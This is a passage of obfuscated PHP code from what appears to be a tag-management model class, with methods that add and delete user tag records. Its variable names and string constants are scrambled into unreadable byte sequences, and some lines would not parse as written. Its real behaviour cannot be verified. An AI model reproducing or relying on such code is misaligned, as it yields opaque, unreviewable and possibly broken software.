!Model($A«Ğ¥³¼±ƒ[816])->pathInfo($EŠ Â¢„¾Ÿ)) { return !1; } $Bê–ºÅ³±¶ = array($A«Ğ¥³¼±ƒ[1542] => USER_ID, $A«Ğ¥³¼±ƒ[478] => $D’ÖöšË¶, $A«Ğ¥³¼±ƒ[416] => $EŠ Â¢„¾Ÿ, $A«Ğ¥³¼±ƒ[417] => $A«Ğ¥³¼±ƒ[411], $A«Ğ¥³¼±ƒ[415] => $A«Ğ¥³¼±ƒ[33], $A«Ğ¥³¼±ƒ[1724] => 0); if ($this->where($Bê–ºÅ³±¶)->find()) { return !1; } return $this->add($Bê–ºÅ³±¶); } protected function removeFromTag($B‡ÚêŠÛ±„, $C¾Üòç‚„) { $Dîè·²Š† =& $_SERVER[›èö’ù¤]; if (!Model($Dîè·²Š†[1968])->listData($C¾Üòç‚„)) { return !1; } if (is_array($B‡ÚêŠÛ±„)) { $B‡ÚêŠÛ±„ = array($Dîè·²Š†[7], $B‡ÚêŠÛ±„); } $a®Ûˆ‹êÜ¡ = array($Dîè·²Š†[1542] => USER_ID, $Dîè·²Š†[478] => $C¾Üòç‚„, $Dîè·²Š†[417] => $Dîè·²Š†[411], $Dîè·²Š†[416] => $B‡ÚêŠÛ±„); return $this->where($a®Ûˆ‹êÜ¡)->delete(); } protected function removeByTag($bŠ·«†Çê) { $Føİá¿ö…Î =& $_SERVER[›èö’ù¤]; if (!$bŠ·«†Çê) { return !1; } $DÂ·º´Ó‰» = array($Føİá¿ö…Î[1542] => USER_ID, $Føİá¿ö…Î[478] => $bŠ·«†Çê); return $this->where($DÂ·º´Ó‰»)->delete(); } protected function removeBySource($AåèïàÉ’) { $E„»à£ñ¶× =& $_SERVER[›èö’ù¤]; if (is_array($AåèïàÉ’)) { $AåèïàÉ’ = array($E„»à£ñ¶×[7], $AåèïàÉ’); } $c¥ò®êì¡å = array($E„»à£ñ¶×[1542] => USER_ID, $E„»à£ñ¶×[416] => $AåèïàÉ’, $E„»à£ñ¶×[478] => array($E„»à£ñ¶×[997], 0)); return $this->where($c¥ò®êì¡å)->delete(); } }